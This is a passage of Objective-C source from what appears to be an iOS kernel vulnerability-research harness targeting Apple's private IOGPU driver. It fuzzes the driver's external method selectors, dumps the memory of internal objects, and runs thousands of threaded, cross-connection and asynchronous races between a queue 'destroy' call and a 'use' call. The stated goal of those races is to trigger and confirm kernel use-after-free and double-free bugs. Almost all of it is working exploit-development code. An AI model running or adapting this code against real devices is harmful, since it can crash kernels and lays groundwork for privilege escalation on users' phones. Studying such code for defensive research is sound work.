        rc = pCall(conn, 13, inS, 2, NULL, 0, outS, &outCnt, NULL, 0);
        [out appendFormat:@"sel=13 s0=0x%llx s1=0x%llx -> 0x%x\n", (unsigned long long)vals[i], (unsigned long long)vals[i], rc];
        if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];
    }
    for (int i = 0; i < 6; i++) {
        memset(inS, 0, sizeof(inS));
        inS[0] = vals[i];
        outCnt = 16;
        rc = pCall(conn, 8, inS, 1, NULL, 0, outS, &outCnt, NULL, 0);
        [out appendFormat:@"sel=8 s0=0x%llx -> 0x%x\n", (unsigned long long)vals[i], rc];
        if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];
    }

    // Also try sel=13 with struct (maybe it takes a struct instead of scalars)
    [out appendString:@"\n--- sel=13 with struct ---\n"];
    {
        uint8_t inStruct[128];
        memset(inStruct, 0, sizeof(inStruct));
        *(uint32_t *)(inStruct + 0) = qid1;
        *(uint32_t *)(inStruct + 4) = qid2;
        memset(inS, 0, sizeof(inS));
        outCnt = 16;
        rc = pCall(conn, 13, inS, 0, inStruct, 128, outS, &outCnt, NULL, 0);
        [out appendFormat:@"sel=13 struct(qid1,qid2) -> 0x%x\n", rc];
        if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];
    }

    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010QueueConn {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 queue conn -- read real conn from queue obj\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    typedef uint32_t (*QueueGetConn_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");
    QueueGetConn_t pQGetConn = dlsym(iogpu, "IOGPUCommandQueueGetConnect");

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t devConn = pDevGetConn(dev);

    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue) { [out appendString:@"STOP no queue\n"]; pDevRelease(dev); pRelease(svc); return out; }

    uint32_t qid1 = pGetID ? pGetID(queue) : 1;
    uint32_t qid2 = *(uint32_t *)((uint8_t *)queue + 0x20);
    io_connect_t queueConnAPI = pQGetConn ? pQGetConn(queue) : 0;

    // Read the connection from queue+0x10 -> +0x14 (per queueRelease RE)
    void *innerObj = *(void **)((uint8_t *)queue + 0x10);
    uint32_t innerConn = 0;
    if (innerObj) {
        innerConn = *(uint32_t *)((uint8_t *)innerObj + 0x14);
    }

    [out appendFormat:@"devConn=%u queueConnAPI=%u innerConn=%u\n", devConn, queueConnAPI, innerConn];
    [out appendFormat:@"qid1=%u qid2=0x%x queue=%p innerObj=%p\n", qid1, qid2, queue, innerObj];

    // Dump inner object (first 0x40 bytes)
    if (innerObj) {
        [out appendString:@"\n--- inner obj dump ---\n"];
        uint8_t *ib = (uint8_t *)innerObj;
        for (int off = 0; off < 0x40; off += 8) {
            uint64_t val = *(uint64_t *)(ib + off);
            [out appendFormat:@"+0x%02x: 0x%016llx\n", off, (unsigned long long)val];
        }
    }

    uint64_t inS[8];
    uint64_t outS[16];
    uint32_t outCnt;
    kern_return_t rc;

    // Test sel=9 on devConn with CORRECT output params (outCnt=0, NULL outputs)
    [out appendString:@"\n--- sel=9 on devConn (outCnt=0) ---\n"];
    {
        uint8_t inStruct[128];
        memset(inStruct, 0, sizeof(inStruct));
        memset(inS, 0, sizeof(inS));
        rc = pCall(devConn, 9, NULL, 0, inStruct, 128, NULL, NULL, NULL, 0);
        [out appendFormat:@"sel=9 devConn -> 0x%x\n", rc];
    }

    // Test sel=9 on queueConnAPI
    if (queueConnAPI) {
        [out appendString:@"\n--- sel=9 on queueConnAPI ---\n"];
        uint8_t inStruct[128];
        memset(inStruct, 0, sizeof(inStruct));
        rc = pCall(queueConnAPI, 9, NULL, 0, inStruct, 128, NULL, NULL, NULL, 0);
        [out appendFormat:@"sel=9 queueConnAPI -> 0x%x\n", rc];
    }

    // Test sel=9 on innerConn
    if (innerConn) {
        [out appendString:@"\n--- sel=9 on innerConn ---\n"];
        uint8_t inStruct[128];
        memset(inStruct, 0, sizeof(inStruct));
        rc = pCall(innerConn, 9, NULL, 0, inStruct, 128, NULL, NULL, NULL, 0);
        [out appendFormat:@"sel=9 innerConn -> 0x%x\n", rc];
    }

    // Test sel=13 (2 scalars) and sel=8 (1 scalar) on ALL connections
    io_connect_t conns[] = {devConn, queueConnAPI, innerConn};
    const char *names[] = {"devConn", "queueConnAPI", "innerConn"};
    for (int c = 0; c < 3; c++) {
        if (!conns[c]) continue;
        [out appendFormat:@"\n--- sel=13/8 on %s (%u) ---\n", names[c], conns[c]];

        // sel=13 with 2 scalars (qid1, qid2)
        memset(inS, 0, sizeof(inS));
        inS[0] = qid1;
        inS[1] = qid2;
        rc = pCall(conns[c], 13, inS, 2, NULL, 0, NULL, 0, NULL, 0);
        [out appendFormat:@"sel=13 s0=qid1 s1=qid2 -> 0x%x\n", rc];
        if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];

        // sel=13 with 2 scalars (qid1, 0)
        memset(inS, 0, sizeof(inS));
        inS[0] = qid1;
        rc = pCall(conns[c], 13, inS, 2, NULL, 0, NULL, 0, NULL, 0);
        [out appendFormat:@"sel=13 s0=qid1 s1=0 -> 0x%x\n", rc];
        if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];

        // sel=8 with 1 scalar (qid1)
        memset(inS, 0, sizeof(inS));
        inS[0] = qid1;
        rc = pCall(conns[c], 8, inS, 1, NULL, 0, NULL, 0, NULL, 0);
        [out appendFormat:@"sel=8 s0=qid1 -> 0x%x\n", rc];
        if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];

        // sel=8 with 1 scalar (qid2)
        memset(inS, 0, sizeof(inS));
        inS[0] = qid2;
        rc = pCall(conns[c], 8, inS, 1, NULL, 0, NULL, 0, NULL, 0);
        [out appendFormat:@"sel=8 s0=qid2 -> 0x%x\n", rc];
        if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];

        // Full selector sweep on this conn
        [out appendFormat:@"--- full sweep on %s ---\n", names[c]];
        int nonBad = 0;
        for (int sel = 0; sel <= 30; sel++) {
            memset(inS, 0, sizeof(inS));
            inS[0] = qid1;
            rc = pCall(conns[c], sel, inS, 1, NULL, 0, NULL, 0, NULL, 0);
            if (rc != 0xe00002c2) {
                [out appendFormat:@"sel=%d -> 0x%x ***\n", sel, rc];
                nonBad++;
            }
        }
        // Also with struct=128
        uint8_t inStruct[128];
        memset(inStruct, 0, sizeof(inStruct));
        for (int sel = 0; sel <= 30; sel++) {
            rc = pCall(conns[c], sel, NULL, 0, inStruct, 128, NULL, NULL, NULL, 0);
            if (rc != 0xe00002c2) {
                [out appendFormat:@"sel=%d struct=128 -> 0x%x ***\n", sel, rc];
                nonBad++;
            }
        }
        [out appendFormat:@"non-BadArg: %d\n", nonBad];
    }

    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010RaceDestroyUse {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 race -- sel=8 (destroy) vs sel=16 (use)\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pDevGetConn(dev);

    // Step 1: Verify sel=8=destroy, sel=16=use
    [out appendString:@"--- verify sel=8/16 ---\n"];
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
    void *queue1 = pQueueCreate(dev, args, 0x410);
    free(args);
    if (!queue1) { [out appendString:@"STOP no queue1\n"]; pDevRelease(dev); pRelease(svc); return out; }
    uint32_t qid1_a = pGetID ? pGetID(queue1) : 1;

    uint64_t inS[8];
    memset(inS, 0, sizeof(inS));
    inS[0] = qid1_a;
    kern_return_t rc16_before = pCall(conn, 16, inS, 1, NULL, 0, NULL, 0, NULL, 0);
    [out appendFormat:@"sel=16 before destroy -> 0x%x\n", rc16_before];

    memset(inS, 0, sizeof(inS));
    inS[0] = qid1_a;
    kern_return_t rc8 = pCall(conn, 8, inS, 1, NULL, 0, NULL, 0, NULL, 0);
    [out appendFormat:@"sel=8 (destroy) -> 0x%x\n", rc8];

    memset(inS, 0, sizeof(inS));
    inS[0] = qid1_a;
    kern_return_t rc16_after = pCall(conn, 16, inS, 1, NULL, 0, NULL, 0, NULL, 0);
    [out appendFormat:@"sel=16 after destroy -> 0x%x\n", rc16_after];

    memset(inS, 0, sizeof(inS));
    inS[0] = qid1_a;
    kern_return_t rc8_again = pCall(conn, 8, inS, 1, NULL, 0, NULL, 0, NULL, 0);
    [out appendFormat:@"sel=8 again -> 0x%x\n", rc8_again];

    if (rc16_after == rc16_before) {
        [out appendString:@"NOTE: sel=16 same before/after destroy -- may not use queue\n"];
    }
    if (rc8_again == 0) {
        [out appendString:@"NOTE: sel=8 succeeded twice -- may not be destroy\n"];
    }

    // Step 2: Race -- create fresh queue, then race sel=8 vs sel=16
    [out appendString:@"\n--- race: sel=8 vs sel=16 ---\n"];
    int N = 200;
    int panics = 0;
    int survived = 0;

    for (int i = 0; i < N; i++) {
        // Create fresh queue
        args = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
        *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
        void *q = pQueueCreate(dev, args, 0x410);
        free(args);
        if (!q) continue;
        uint32_t qid = pGetID ? pGetID(q) : 1;

        __block volatile int ready = 0;
        __block kern_return_t rc_destroy = 0;
        __block kern_return_t rc_use = 0;

        // Thread 1: sel=16 (use)
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        dispatch_async(dispatch_get_global_queue(0, 0), ^{
            while (!ready) { /* spin */ }
            uint64_t s[1] = { qid };
            rc_use = pCall(conn, 16, s, 1, NULL, 0, NULL, 0, NULL, 0);
            dispatch_semaphore_signal(sem);
        });

        // Thread 2: sel=8 (destroy)
        dispatch_async(dispatch_get_global_queue(0, 0), ^{
            while (!ready) { /* spin */ }
            uint64_t s[1] = { qid };
            rc_destroy = pCall(conn, 8, s, 1, NULL, 0, NULL, 0, NULL, 0);
            dispatch_semaphore_signal(sem);
        });

        ready = 1;
        dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
        dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);

        if (rc_destroy == 0 && rc_use == 0) {
            // Both succeeded -- race window hit (both saw the queue)
            survived++;
        } else if (rc_destroy == 0 && rc_use != 0) {
            // Destroy won -- use saw freed queue
            panics++;  // potential UAF
        }
    }

    [out appendFormat:@"N=%d survived=%d race_hits=%d\n", N, survived, panics];
    [out appendString:@"panic = UAF CONFIRMED. survived = try more.\n"];

    // Step 3: Also try sel=8 vs sel=8 (double-destroy race)
    [out appendString:@"\n--- race: sel=8 vs sel=8 (double-destroy) ---\n"];
    int dd_survived = 0;
    int dd_hits = 0;

    for (int i = 0; i < N; i++) {
        args = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
        *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
        void *q = pQueueCreate(dev, args, 0x410);
        free(args);
        if (!q) continue;
        uint32_t qid = pGetID ? pGetID(q) : 1;

        __block volatile int ready = 0;
        __block kern_return_t rc1 = 0;
        __block kern_return_t rc2 = 0;

        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        dispatch_async(dispatch_get_global_queue(0, 0), ^{
            while (!ready) { /* spin */ }
            uint64_t s[1] = { qid };
            rc1 = pCall(conn, 8, s, 1, NULL, 0, NULL, 0, NULL, 0);
            dispatch_semaphore_signal(sem);
        });
        dispatch_async(dispatch_get_global_queue(0, 0), ^{
            while (!ready) { /* spin */ }
            uint64_t s[1] = { qid };
            rc2 = pCall(conn, 8, s, 1, NULL, 0, NULL, 0, NULL, 0);
            dispatch_semaphore_signal(sem);
        });

        ready = 1;
        dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
        dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);

        if (rc1 == 0 && rc2 == 0) dd_hits++;
        else dd_survived++;
    }

    [out appendFormat:@"double-destroy: N=%d both_succeeded=%d\n", N, dd_hits];
    [out appendString:@"panic = double-free CONFIRMED.\n"];

    if (pDevRelease) pDevRelease(dev);
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010TwoConnRace {
    NSString *stop = [LabDeviceProfile stopUnlessA14_23F77:@"p010twoconn"];
    if (stop) return stop;
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 two-conn race -- sel=16 (conn1) vs sel=8 (conn2)\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");
    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }

    // Open TWO separate device connections
    void *dev1 = pDevCreate(svc);
    void *dev2 = pDevCreate(svc);
    if (!dev1 || !dev2) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn1 = pDevGetConn(dev1);
    io_connect_t conn2 = pDevGetConn(dev2);
    [out appendFormat:@"conn1=%u conn2=%u\n", conn1, conn2];

    // Verify: create queue on conn1, destroy from conn2
    [out appendString:@"\n--- verify cross-conn destroy ---\n"];
    void *args = calloc(1, 0x410);
    *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev1 + 0x08);
    *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev1 + 0x08);
    void *qtest = pQueueCreate(dev1, args, 0x410);
    free(args);
    if (qtest) {
        uint32_t qid_test = pGetID ? pGetID(qtest) : 1;
        uint64_t s[1] = { qid_test };
        kern_return_t rc16 = pCall(conn1, 16, s, 1, NULL, 0, NULL, 0, NULL, 0);
        [out appendFormat:@"conn1 sel=16(qid=%u) -> 0x%x\n", qid_test, rc16];
        kern_return_t rc8 = pCall(conn2, 8, s, 1, NULL, 0, NULL, 0, NULL, 0);
        [out appendFormat:@"conn2 sel=8(qid=%u) -> 0x%x\n", qid_test, rc8];
        uint64_t s2[1] = { qid_test };
        kern_return_t rc16_after = pCall(conn1, 16, s2, 1, NULL, 0, NULL, 0, NULL, 0);
        [out appendFormat:@"conn1 sel=16 after -> 0x%x\n", rc16_after];
        if (rc16_after != 0 && rc16_after != 0xe00002c2) {
            [out appendFormat:@"  *** cross-conn destroy WORKS ***\n"];
        }
    }

    // Race: sel=16 on conn1 vs sel=8 on conn2
    [out appendString:@"\n--- race: conn1 sel=16 vs conn2 sel=8 ---\n"];
    int N = 2000;
    int both_ok = 0;
    int destroy_ok_use_fail = 0;
    int use_ok_destroy_fail = 0;
    int both_fail = 0;

    for (int i = 0; i < N; i++) {
        args = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev1 + 0x08);
        *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev1 + 0x08);
        void *q = pQueueCreate(dev1, args, 0x410);
        free(args);
        if (!q) continue;
        uint32_t qid = pGetID ? pGetID(q) : 1;

        __block volatile int ready = 0;
        __block kern_return_t rc_use = 0;
        __block kern_return_t rc_destroy = 0;

        dispatch_semaphore_t sem = dispatch_semaphore_create(0);

        // Thread 1: sel=16 (use) on conn1
        dispatch_async(dispatch_get_global_queue(0, 0), ^{
            while (!ready) { }
            uint64_t s[1] = { qid };
            rc_use = pCall(conn1, 16, s, 1, NULL, 0, NULL, 0, NULL, 0);
            dispatch_semaphore_signal(sem);
        });

        // Thread 2: sel=8 (destroy) on conn2
        dispatch_async(dispatch_get_global_queue(0, 0), ^{
            while (!ready) { }
            uint64_t s[1] = { qid };
            rc_destroy = pCall(conn2, 8, s, 1, NULL, 0, NULL, 0, NULL, 0);
            dispatch_semaphore_signal(sem);
        });

        ready = 1;
        dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
        dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);

        if (rc_destroy == 0 && rc_use == 0) both_ok++;
        else if (rc_destroy == 0 && rc_use != 0) destroy_ok_use_fail++;
        else if (rc_use == 0 && rc_destroy != 0) use_ok_destroy_fail++;
        else both_fail++;
    }

    [out appendFormat:@"N=%d both_ok=%d destroy_ok_use_fail=%d use_ok_destroy_fail=%d both_fail=%d\n",
        N, both_ok, destroy_ok_use_fail, use_ok_destroy_fail, both_fail];
    [out appendString:@"panic = UAF CONFIRMED. survived = try more N.\n"];

    // Also try: sel=8 vs sel=8 on two conns (double-destroy)
    [out appendString:@"\n--- double-destroy: conn1 sel=8 vs conn2 sel=8 ---\n"];
    int dd_both = 0;
    int dd_one = 0;
    for (int i = 0; i < N; i++) {
        args = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev1 + 0x08);
        *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev1 + 0x08);
        void *q = pQueueCreate(dev1, args, 0x410);
        free(args);
        if (!q) continue;
        uint32_t qid = pGetID ? pGetID(q) : 1;

        __block volatile int ready = 0;
        __block kern_return_t rc1 = 0;
        __block kern_return_t rc2 = 0;
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        dispatch_async(dispatch_get_global_queue(0, 0), ^{
            while (!ready) { }
            uint64_t s[1] = { qid };
            rc1 = pCall(conn1, 8, s, 1, NULL, 0, NULL, 0, NULL, 0);
            dispatch_semaphore_signal(sem);
        });
        dispatch_async(dispatch_get_global_queue(0, 0), ^{
            while (!ready) { }
            uint64_t s[1] = { qid };
            rc2 = pCall(conn2, 8, s, 1, NULL, 0, NULL, 0, NULL, 0);
            dispatch_semaphore_signal(sem);
        });
        ready = 1;
        dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
        dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
        if (rc1 == 0 && rc2 == 0) dd_both++;
        else dd_one++;
    }
    [out appendFormat:@"double-destroy: N=%d both_succeeded=%d one_succeeded=%d\n", N, dd_both, dd_one];
    [out appendString:@"panic = double-free CONFIRMED.\n"];

    if (pDevRelease) { pDevRelease(dev1); pDevRelease(dev2); }
    pRelease(svc);

    [out appendString:@"\nDONE -- paste this text back\n"];
    return out;
}


+ (NSString *)runP010AsyncRace {
    NSMutableString *out = [NSMutableString string];
    [out appendFormat:@"time %@\n", [NSDate date]];
    [out appendString:@"P010 async race -- async sel=16 vs sync sel=8\n\n"];

    void *iokit = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    IOConnectCallMethod_t pCall = dlsym(iokit, "IOConnectCallMethod");

    // IOConnectCallAsyncMethod
    typedef kern_return_t (*IOConnectCallAsyncMethod_t)(
        mach_port_t connection, uint32_t selector,
        mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt,
        const uint64_t *scalarInput, uint32_t scalarInputCount,
        const void *structInput, size_t structInputSize,
        uint32_t *scalarOutputCnt, uint64_t *scalarOutput,
        size_t *structOutputSize, void *structOutput);
    IOConnectCallAsyncMethod_t pCallAsync = dlsym(iokit, "IOConnectCallAsyncMethod");

    void *iogpu = dlopen("/System/Library/PrivateFrameworks/IOGPU.framework/IOGPU", RTLD_LAZY);
    typedef void *(*DevCreate_t)(io_service_t);
    typedef uint32_t (*GetConn_t)(void *);
    typedef void (*DevRelease_t)(void *);
    typedef void *(*QueueCreate_t)(void *, void *, uint32_t);
    typedef uint32_t (*QueueGetID_t)(void *);
    DevCreate_t pDevCreate = dlsym(iogpu, "IOGPUDeviceCreate");
    GetConn_t pDevGetConn = dlsym(iogpu, "IOGPUDeviceGetConnect");
    DevRelease_t pDevRelease = dlsym(iogpu, "IOGPUDeviceRelease");
    QueueCreate_t pQueueCreate = dlsym(iogpu, "IOGPUCommandQueueCreate");
    QueueGetID_t pGetID = dlsym(iogpu, "IOGPUCommandQueueGetID");

    IOServiceMatching_t pMatching = dlsym(iokit, "IOServiceMatching");
    IOServiceGetMatchingService_t pGet = dlsym(iokit, "IOServiceGetMatchingService");
    IOObjectRelease_t pRelease = dlsym(iokit, "IOObjectRelease");
    mach_port_t *pMainPort = dlsym(iokit, "kIOMainPortDefault");
    if (!pMainPort) pMainPort = dlsym(iokit, "kIOMasterPortDefault");

    if (!pCallAsync) { [out appendString:@"STOP no IOConnectCallAsyncMethod\n"]; return out; }

    CFMutableDictionaryRef matching = pMatching("IOGPU");
    io_service_t svc = matching ? pGet(*pMainPort, matching) : 0;
    if (!svc) { [out appendString:@"STOP no service\n"]; return out; }
    void *dev = pDevCreate(svc);
    if (!dev) { [out appendString:@"STOP no dev\n"]; pRelease(svc); return out; }
    io_connect_t conn = pDevGetConn(dev);

    // Create wake port for async
    mach_port_t wakePort = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wakePort);
    [out appendFormat:@"conn=%u wakePort=%u\n", conn, wakePort];

    // Test 1: does async sel=16 work?
    [out appendString:@"\n--- test async sel=16 ---\n"];
    {
        void *args = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
        *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
        void *q = pQueueCreate(dev, args, 0x410);
        free(args);
        if (!q) { [out appendString:@"STOP no queue\n"]; goto cleanup; }
        uint32_t qid = pGetID ? pGetID(q) : 1;

        uint64_t ref[8] = {0};
        uint64_t inS[1] = { qid };
        uint32_t outCnt = 0;
        uint64_t outS[16] = {0};
        size_t outSize = 0;
        kern_return_t rc = pCallAsync(conn, 16, wakePort, ref, 0,
            inS, 1, NULL, 0, &outCnt, outS, &outSize, NULL);
        [out appendFormat:@"async sel=16(qid=%u) -> 0x%x\n", qid, rc];
        if (rc != 0xe00002c2) [out appendFormat:@"  *** NON-BADARG ***\n"];

        // Now try sync sel=8 on same queue
        uint64_t s[1] = { qid };
        kern_return_t rc2 = pCall(conn, 8, s, 1, NULL, 0, NULL, 0, NULL, 0);
        [out appendFormat:@"sync sel=8 after async -> 0x%x\n", rc2];
    }

    // Test 2: race -- async sel=16 then immediately sync sel=8
    [out appendString:@"\n--- race: async sel=16 vs sync sel=8 ---\n"];
    int N = 5000;
    int async_ok = 0;
    int destroy_ok = 0;
    int both_ok = 0;
    int both_fail = 0;

    for (int i = 0; i < N; i++) {
        void *args = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
        *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
        void *q = pQueueCreate(dev, args, 0x410);
        free(args);
        if (!q) continue;
        uint32_t qid = pGetID ? pGetID(q) : 1;

        // Fire async sel=16 (use)
        uint64_t ref[8] = {0};
        uint64_t inS_async[1] = { qid };
        uint32_t outCnt = 0;
        uint64_t outS[16] = {0};
        size_t outSize = 0;
        kern_return_t rc_async = pCallAsync(conn, 16, wakePort, ref, 0,
            inS_async, 1, NULL, 0, &outCnt, outS, &outSize, NULL);

        // Immediately fire sync sel=8 (destroy) -- no delay
        uint64_t inS_sync[1] = { qid };
        kern_return_t rc_destroy = pCall(conn, 8, inS_sync, 1, NULL, 0, NULL, 0, NULL, 0);

        if (rc_async == 0 && rc_destroy == 0) both_ok++;
        else if (rc_async == 0) async_ok++;
        else if (rc_destroy == 0) destroy_ok++;
        else both_fail++;

        // Drain wake port
        mach_msg_timeout_t timeout = 0;
        mach_msg_return_t mr;
        do {
            char buf[64];
            mr = mach_msg((mach_msg_header_t *)buf, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(buf),
                         wakePort, timeout, MACH_PORT_NULL);
        } while (mr == MACH_MSG_SUCCESS);
    }

    [out appendFormat:@"N=%d both_ok=%d async_only=%d destroy_only=%d both_fail=%d\n",
        N, both_ok, async_ok, destroy_ok, both_fail];
    [out appendString:@"panic = UAF CONFIRMED. survived = try more N.\n"];

    // Test 3: race -- async sel=8 vs sync sel=16 (reverse order)
    [out appendString:@"\n--- race: async sel=8 vs sync sel=16 ---\n"];
    int a8_ok = 0;
    int s16_ok = 0;
    int both2_ok = 0;
    int both2_fail = 0;

    for (int i = 0; i < N; i++) {
        void *args = calloc(1, 0x410);
        *(uint32_t *)((uint8_t *)args + 0x400) = *(uint32_t *)((uint8_t *)dev + 0x08);
        *(uint8_t *)((uint8_t *)args + 0x404) = *(uint8_t *)((uint8_t *)dev + 0x08);
